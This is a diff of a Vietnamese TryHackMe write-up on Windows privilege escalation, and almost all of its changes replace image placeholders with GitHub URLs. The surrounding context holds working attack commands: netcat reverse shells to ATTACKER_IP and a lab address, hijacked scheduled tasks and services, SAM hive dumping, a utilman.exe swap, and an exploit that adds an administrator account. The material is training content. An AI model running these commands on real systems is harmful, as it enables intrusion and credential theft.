@@ -56,7 +56,7 @@ Trong quá trình này, thông tin tài khoản quản trị viên có thể b�
 
 Khi truy cập 1 trong các vị trí này, có thể tìm thấy thông tin xác thực như sau: 
 
-![img](165)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image165.png?raw=true)
 
 **Tìm Kiếm Thông Tin Đăng Nhập Trên Windows**
 
@@ -97,29 +97,29 @@ PuTTY lưu thông tin proxy dưới dạng văn bản rõ ràng trong registry:
 
 => Question: 
 
-![img](166)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image166.png?raw=true)
 
 => Lịch sử dùng lệnh
 
-![img](167)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image167.png?raw=true)
 
-![img](168)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image168.png?raw=true)
 
 1 terminal mới mở ra: 
 
-![img](169)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image169.png?raw=true)
 
 Truy cập vào Desktop của mike.katz:
 
-![img](170)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image170.png?raw=true)
 
-![img](171)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image171.png?raw=true)
 
 Đọc file flag.txt 
 
-![img](172)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image172.png?raw=true)
 
-![img](173)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image173.png?raw=true)
 
 => tìm ra password của thom.smith user: CoolPass2021
 
@@ -133,7 +133,7 @@ Các tác vụ đã lên lịch trên hệ thống đích, có thể thấy mộ
 
 Các tác vụ đã lên lịch có thể được liệt kê từ dòng lệnh bằng lệnh ***schtasks*** mà không cần bất kỳ tùy chọn nào. Để truy xuất thông tin chi tiết về bất kỳ dịch vụ nào, sử dụng lệnh như lệnh sau:
 
-![img](174)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image174.png?raw=true)
 
 Nhận được nhiều thông tin về tác vụ, nhưng điều quan trọng cần để ý là tham số "Task To Run" cho biết tác vụ nào được thực thi bởi tác vụ đã lên lịch và tham số "Run As User”, hiển thị người dùng sẽ được sử dụng để thực hiện nhiệm vụ.
 
@@ -141,13 +141,13 @@ Nếu người dùng hiện tại có thể sửa đổi hoặc ghi đè tệp t
  
 Để kiểm tra quyền của tệp trên tệp thực thi, sử dụng ***icacls***:
 
-![img](175)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image175.png?raw=true)
 
 => Nhóm BUILTIN\Users có toàn quyền truy cập (F) đối với tệp nhị phân của tác vụ. Điều này có nghĩa là có thể sửa đổi tệp .bat và chèn bất kỳ tải trọng nào. Để thuận tiện, nc64.exe có thể được tìm thấy trên C:\tools. Thay đổi tệp bat để tạo ra một reverse shell:
 
     C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
 
-![img](176)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image176.png?raw=true)
 
 => Khởi động trình nghe trên máy tấn công trên cùng một cổng đã chỉ ra trên reverse shell:
 
@@ -155,15 +155,15 @@ Nếu người dùng hiện tại có thể sửa đổi hoặc ghi đè tệp t
 
 Lần tới khi scheduled task chạy, sẽ nhận được revese shell với các đặc quyền của taskusr1. Hoặc để tiết kiệm thời gian, có thể chạy tác vụ bằng lệnh sau:
 
-![img](177)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image177.png?raw=true)
 
 => nhận được reverse shell với các đặc quyền của người dùng taskusr1:
 
-![img](178)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image178.png?raw=true)
 
-![img](179)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image179.png?raw=true)
 
-![img](180)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image180.png?raw=true)
 
 **AlwaysInstallElevated**
 
@@ -175,7 +175,7 @@ Tuy nhiên, nếu được cấu hình với quyền cao hơn, bất kỳ tài k
 
 Phương pháp này yêu cầu phải đặt hai giá trị đăng ký. Có thể truy vấn chúng từ dòng lệnh bằng các lệnh bên dưới:
 
-![img](181)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image181.png?raw=true)
 
 Để có thể khai thác lỗ hổng này, cần phải thiết lập cả hai. Nếu không, việc khai thác sẽ không thể thực hiện được. Nếu những điều này được đặt, có thể tạo tệp .msi độc hại bằng cách sử dụng msfvenom, như bên dưới:
 
@@ -183,7 +183,7 @@ Phương pháp này yêu cầu phải đặt hai giá trị đăng ký. Có th�
 
 Vì đây là một reverse shell, nên chạy mô-đun Metasploit Handler được cấu hình tương ứng. Khi đã chuyển tệp đã tạo, có thể chạy trình cài đặt bằng lệnh bên dưới và nhận reverse shell: 
 
-![img](182)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image182.png?raw=true)
 
 **Task 5: Abusing Service Misconfigurations - Lạm dụng cấu hình sai dịch vụ**
 
@@ -201,19 +201,19 @@ Ngoài ra, mỗi dịch vụ chạy dưới một tài khoản người dùng c�
 
 Kiểm tra cấu hình dịch vụ **apphostsvc** bằng lệnh ***sc qc***:
 
-![img](183)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image183.png?raw=true)
 
 Thấy rằng tệp thực thi liên quan được chỉ định thông qua tham số BINARY_PATH_NAME và tài khoản được sử dụng để chạy dịch vụ được hiển thị trên tham số SERVICE_START_NAME.
 
 Các dịch vụ có Discretionary Access Control List (DACL), cho biết ai có quyền bắt đầu, dừng, tạm dừng, trạng thái truy vấn, cấu hình truy vấn hoặc định cấu hình lại dịch vụ, cùng với các đặc quyền khác
 
-![img](184)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image184.png?raw=true)
 
 Tất cả các cấu hình dịch vụ được lưu trữ trên registry trong 
     
     HKLM\SYSTEM\CurrentControlSet\Services\
 
-![img](185)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image185.png?raw=true)
 
 Một subkey tồn tại cho mọi dịch vụ trong hệ thống. Có thể thấy tệp thực thi được liên kết trên giá trị ImagePath và tài khoản được sử dụng để khởi động dịch vụ trên giá trị ObjectName. Nếu DACL đã được định cấu hình cho dịch vụ, nó sẽ được lưu trữ trong subkey có tên Security. 
 
@@ -223,13 +223,13 @@ Nếu tệp thực thi được liên kết với một dịch vụ có quyền 
 
 Xem xét một lỗ hổng được tìm thấy trên Bộ lập lịch hệ thống Splinterware. Để bắt đầu, truy vấn cấu hình dịch vụ bằng sc:
 
-![img](186)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image186.png?raw=true)
 
 Thấy rằng dịch vụ được cài đặt bởi phần mềm dễ bị tấn công chạy dưới dạng svcuser1 và tệp thực thi được liên kết với dịch vụ nằm trong C:\Progra~2\System~1\WService.exe
 
 Tiến hành kiểm tra các quyền trên tệp thực thi:
 
-![img](187)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image187.png?raw=true)
 
 => Everyone Group có quyền sửa đổi (M) đối với tệp thực thi của dịch vụ. 
 
@@ -237,33 +237,33 @@ Tiến hành kiểm tra các quyền trên tệp thực thi:
 
 Tạo một payload dịch vụ exe bằng cách sử dụng msfvenom và phân phối nó thông qua máy chủ web python:
 
-![img](188)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image188.png?raw=true)
 
-![img](189)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image189.png?raw=true)
 
 Pull payload từ Powershell bằng lệnh sau:
 
-![img](190)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image190.png?raw=true)
 
-![img](191)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image191.png?raw=true)
 
 Khi payload đã có trong máy chủ Windows,tiến hành thay thế tệp thực thi dịch vụ bằng payload, đồng thời cấp toàn quyền cho Everyone group để người dùng khác có thể thực thi payload: 
 
-![img](192)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image192.png?raw=true)
 
 Bắt đầu trình nghe ngược trên máy tấn công:
 
-![img](193)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image193.png?raw=true)
 
 Khởi động lại dịch vụ:
 
-![img](194)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image194.png?raw=true)
 
 => Nhận được một trình bao đảo ngược với các đặc quyền svcusr1:
 
-![img](195)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image195.png?raw=true)
 
-![img](196)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image196.png?raw=true)
 
 **Unquoted Service Paths**
 
@@ -273,15 +273,15 @@ Ví dụ:
 
 Dịch vụ hợp lệ: 
 
-![img](197)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image197.png?raw=true)
 
 Một dịch vụ khác mà không có khoảng trắng thích hợp:
 
-![img](198)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image198.png?raw=true)
 
 Vì có khoảng trắng trên tên thư mục "Disk Sorter Enterprise", lệnh trở nên mơ hồ và SCM không biết thực hiện thao tác nào sau đây:
 
-![img](199)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image199.png?raw=true)
 
 Thay vì thất bại như lẽ ra phải xảy ra, SCM cố gắng trợ giúp người dùng và bắt đầu tìm kiếm từng tệp nhị phân theo thứ tự hiển thị trong bảng:
 
@@ -297,31 +297,31 @@ Trong trường hợp này, các tệp nhị phân của Disk Sorter được c�
 
 Kiểm tra bằng ***icacls***:
 
-![img](200)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image200.png?raw=true)
 
 => Nhóm BUILTIN\\Users có đặc quyền AD và WD, cho phép người dùng tạo các thư mục con và tệp tương ứng.
 
 Tiếp tục tạo payload và tạo kênh lắng nghe trên máy tấn công: 
 
-![img](201)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image201.png?raw=true)
 
 Tải payload trên Windows: 
 
-![img](202)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image202.png?raw=true)
 
-![img](203)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image203.png?raw=true)
 
 Di chuyển payload đến bất kỳ vị trí nào có thể xảy ra việc chiếm quyền điều khiển => Chuyển payload sang C:\MyPrograms\Disk.exe. Cấp cho Mọi người toàn quyền đối với tệp để đảm bảo rằng dịch vụ có thể thực thi tệp đó:
 
-![img](204)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image204.png?raw=true)
 
 Khi dịch vụ được khởi động lại, payload sẽ thực thi:
 
-![img](205)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image205.png?raw=true)
 
-![img](206)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image206.png?raw=true)
 
-![img](207)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image207.png?raw=true)
 
 **Insecure Service Permissions**
 
@@ -331,37 +331,37 @@ Nếu DACL dịch vụ (không phải DACL thực thi của dịch vụ) cho ph�
 
 Lệnh kiểm tra dịch vụ thmservice DACL là:
 
-![img](208)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image208.png?raw=true)
 
 => Nhóm BUILTIN\\Users có quyền SERVICE_ALL_ACCESS, nghĩa là bất kỳ người dùng nào cũng có thể cấu hình lại dịch vụ.
 
 Trước khi thay đổi dịch vụ, xây dựng một reverse shell dịch vụ exe khác và khởi động trình nghe cho nó trên máy của kẻ tấn công:
 
-![img](209)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image209.png?raw=true)
 
 Tải trên Windows: 
 
-![img](210)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image210.png?raw=true)
 
-![img](211)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image211.png?raw=true)
 
 Chuyển tệp thực thi reverse shell sang máy đích và lưu trữ nó trong C:\Users\thm-unpriv\rev-svc3.exe. Sử dụng wget để chuyển tệp thực thi và di chuyển nó đến vị trí mong muốn. Nhớ cấp quyền cho Everyone để thực thi payload:
 
-![img](212)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image212.png?raw=true)
 
 Để thay đổi tài khoản và tệp thực thi được liên kết của dịch vụ, có thể sử dụng lệnh sau (lưu ý khoảng trắng sau dấu bằng khi sử dụng sc.exe):
 
-![img](213)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image213.png?raw=true)
 
 Có thể sử dụng bất kỳ tài khoản nào để chạy dịch vụ.Chọn LocalSystem vì đây là tài khoản có đặc quyền cao nhất hiện có. Để kích hoạt payload, tất cả những gì còn lại là khởi động lại dịch vụ
 
-![img](214)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image214.png?raw=true)
 
 nhận lại một shell trong máy của kẻ tấn công với các đặc quyền SYSTEM:
 
-![img](215)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image215.png?raw=true)
 
-![img](216)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image216.png?raw=true)
 
 **Task 6: Abusing dangerous privileges**
 
@@ -371,7 +371,7 @@ nhận lại một shell trong máy của kẻ tấn công với các đặc quy
 
 Mỗi người dùng có một tập hợp các đặc quyền được chỉ định có thể được kiểm tra bằng lệnh sau:
 
-![img](217)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image217.png?raw=true)
 
 **SeBackup / SeRestore**
 
@@ -381,15 +381,15 @@ Xem xét việc sao chép các tổ đăng ký SAM và SYSTEM để trích xuấ
 
 Cần mở dấu nhắc lệnh bằng tùy chọn "Mở với tư cách quản trị viên" để sử dụng các đặc quyền này. Sẽ được yêu cầu nhập lại mật khẩu để có được bảng điều khiển nâng cao:
 
-![img](218)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image218.png?raw=true)
 
 Kiểm tra các đặc quyền bằng lệnh sau: 
 
-![img](219)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image219.png?raw=true)
 
 Để sao lưu hàm băm SAM và SYSTEM, có thể sử dụng các lệnh sau:
 
-![img](220)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image220.png?raw=true)
 
 Bây giờ có thể sao chép các tệp này vào máy tấn công bằng SMB hoặc bất kỳ phương pháp khả dụng nào khác. Đối với SMB, có thể sử dụng smbserver.py của impacket để khởi động một máy chủ SMB đơn giản với mạng chia sẻ:
 
@@ -398,7 +398,7 @@ Bây giờ có thể sao chép các tệp này vào máy tấn công bằng SMB 
 
 Điều này sẽ tạo một chia sẻ có tên public trỏ đến thư mục share, yêu cầu tên người dùng và mật khẩu của phiên windows hiện tại. 
 
-![img](21)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image221.png?raw=true)
 
 Sử dụng impacket để truy xuất mật khẩu băm của người dùng:
 
@@ -436,33 +436,33 @@ RUn as administrator với cmd.
 
 kiểm tra các đặc quyền bằng lệnh sau:
 
-![img](222)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image222.png?raw=true)
 
 Lạm dụng utilman.exe để nâng cao đặc quyền. Utilman là một ứng dụng Windows tích hợp được sử dụng để cung cấp các tùy chọn Dễ truy cập trong màn hình khóa:
 
-![img](223)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image223.png?raw=true)
 
 Vì Utilman được chạy với các đặc quyền SYSTEM, nên để có được các đặc quyền SYSTEM một cách hiệu quả cần thay thế tệp nhị phân ban đầu với bất kỳ payload nào phù hợp. 
 
 Để thay thế utilman, bắt đầu bằng cách sở hữu nó bằng lệnh sau:
 
-![img](224)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image224.png?raw=true)
 
 Lưu ý rằng việc trở thành chủ sở hữu của một tệp không nhất thiết có nghĩa là có các đặc quyền đối với tệp đó, nhưng là chủ sở hữu, có thể tự gán cho mình bất kỳ đặc quyền nào. Cấp cho người dùng toàn quyền đối với utilman.exe:
 
-![img](225)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image225.png?raw=true)
 
 Thay thế utilman.exe bằng một bản sao của cmd.exe:
 
-![img](226)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image226.png?raw=true)
 
 Kích hoạt utilman, khóa màn hình:
 
-![img](227)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image227.png?raw=true)
 
 Tiếp tục nhấp vào nút "Ease of Access", nút này chạy utilman.exe với các đặc quyền SYSTEM. Vì đã thay thế nó bằng bản sao cmd.exe nên sẽ nhận được dấu nhắc lệnh với các đặc quyền SYSTEM:
 
-![img](228)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image228.png?raw=true)
 
 **SeImpersonate / SeAssignPrimaryToken**
 
@@ -480,7 +480,7 @@ Giả sử rằng đã xâm phạm một trang web chạy trên IIS và đã cà
 
 sử dụng web shell để kiểm tra các đặc quyền được chỉ định của tài khoản bị xâm nhập và xác nhận rằng có cả hai đặc quyền quan tâm cho tác vụ này:
 
-![img](229)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image229.png?raw=true)
 
 RogueWinRM khai thác dịch vụ BITS (Background Intelligent Transfer Service) để thực thi lệnh với quyền SYSTEM. 
 
@@ -496,21 +496,21 @@ Cách thức khai thác:
 
 Trước khi chạy khai thác, khởi động trình nghe netcat để nhận reverse shell trên máy của kẻ tấn công:
 
-![img](230)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image230.png?raw=true)
 
 Sau đó, sử dụng web shell để kích hoạt hoạt động khai thác RogueWinRM bằng lệnh sau:
 
     c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.8.13.3 4442"
 
-![img](231)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image231.png?raw=true)
 
 Tham số -p chỉ định tệp thực thi sẽ được chạy bằng cách khai thác, đó là nc64.exe trong trường hợp này. Tham số -a được sử dụng để truyền đối số cho tệp thực thi. Vì muốn nc64 thiết lập một reverse shell chống lại máy tấn công của nên các đối số được chuyển tới netcat sẽ là -e cmd.exe ATTACKER_IP 4442.
 
 Nếu tất cả đã được thiết lập chính xác, một shell có các đặc quyền SYSTEM:
 
-![img](232)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image232.png?raw=true)
 
-![img](233)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image233.png?raw=true)
 
 **Task 7: Abusing vulnerable software**
 
@@ -523,7 +523,7 @@ Sử dụng wmic để kiểm tra danh sách phần mềm và phiên bản:
 
     wmic product get name,version,vendor
 
-![img](234)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image234.png?raw=true)
 
 Lưu ý: Lệnh này có thể mất một phút để hoàn tất và có thể không hiển thị đầy đủ tất cả phần mềm.
 
@@ -576,7 +576,7 @@ Mã khai thác:
     $s.Send($length)
     $s.Send($command)
 
-![img](235)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image235.png?raw=true)
 
 Có thể mở bảng điều khiển Powershell và dán trực tiếp phần khai thác để thực thi nó
 
@@ -584,25 +584,25 @@ Payload mặc định của kẻ khai thác, được chỉ định trong biến
 
     net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
 
-![img](236)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image236.png?raw=true)
 
 => Chạy code: 
 
-![img](237)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image237.png?raw=true)
 
 Thao tác này sẽ tạo pwnd người dùng bằng mật khẩu SimplePass123 và thêm nó vào nhóm quản trị viên. Nếu việc khai thác thành công, có thể chạy lệnh sau để xác minh rằng người dùng pwnd tồn tại và là một phần của nhóm quản trị viên:
 
-![img](238)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image238.png?raw=true)
 
-![img](239)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image239.png?raw=true)
 
 => Chạy cmd với tư cách Administartor
 
-![img](240)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image240.png?raw=true)
 
-![img](241)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image241.png?raw=true)
 
-![img](242)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image242.png?raw=true)
 
 **Task 8: Tools of the Trade**
 
